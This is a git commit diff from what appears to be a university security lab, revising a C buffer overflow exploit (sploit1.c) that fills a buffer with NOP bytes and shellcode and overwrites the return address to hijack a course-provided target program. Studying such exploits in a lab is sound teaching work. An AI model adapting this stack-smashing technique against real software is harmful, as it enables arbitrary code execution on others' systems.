2ac43b9d820f32acfff7bbefa94d97e01e3efb90
zandent <simon.zhao@mail.utoronto.ca>
2020-09-22 21:04:25 -0400

    update lab1.1

--- lab1/sploits/sploit1.c
+++ lab1/sploits/sploit1.c
@@ -5,38 +5,31 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target1"
-#define TARGET_ADDR 0x40a4fe58
-#define TARGET_ADDR_0 0x58
+#define TARGET_ADDR 0x40a4fe40
+#define TARGET_ADDR_0 0x40
 #define TARGET_ADDR_1 0xfe
 #define TARGET_ADDR_2 0xa4
 #define TARGET_ADDR_3 0x40
-#define BUFSIZE 112
+#define BUFSIZE 140 
 #define SHELLSIZE 45
 int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
-	char attackBuffer[BUFSIZE + 8 + 8 + 1];
+	char attackBuffer[BUFSIZE];
 	int i = 0;
-	for (i = 0; i < BUFSIZE + 8 + 8 + 1; i++){
-		if(i%4==0){
-			attackBuffer[i] = TARGET_ADDR_0;
-		}else if(i%4==1){
-			attackBuffer[i] = TARGET_ADDR_1;
-		}else if(i%4==2){
-			attackBuffer[i] = TARGET_ADDR_2;
-		}else{
-			attackBuffer[i] = TARGET_ADDR_3;
-		}
-	}
-	for (i = 0; i < 3*8; i++){
+	for (i = 0; i < BUFSIZE; i++){
 		attackBuffer[i] = 0x90;
 	}
+	attackBuffer[BUFSIZE - 4] = TARGET_ADDR_0;
+	attackBuffer[BUFSIZE - 3] = TARGET_ADDR_1;
+	attackBuffer[BUFSIZE - 2] = TARGET_ADDR_2;
+	attackBuffer[BUFSIZE - 1] = TARGET_ADDR_3;
 	for (i = 0; i < SHELLSIZE; i++){
-		attackBuffer[i + 3*8] = shellcode[i];
+		attackBuffer[i] = shellcode[i];
 	}
-	attackBuffer[BUFSIZE + 8 + 8] = '\0';
+	//attackBuffer[BUFSIZE] = '\0';
 
 	args[0] = TARGET;
 	args[1] = attackBuffer;
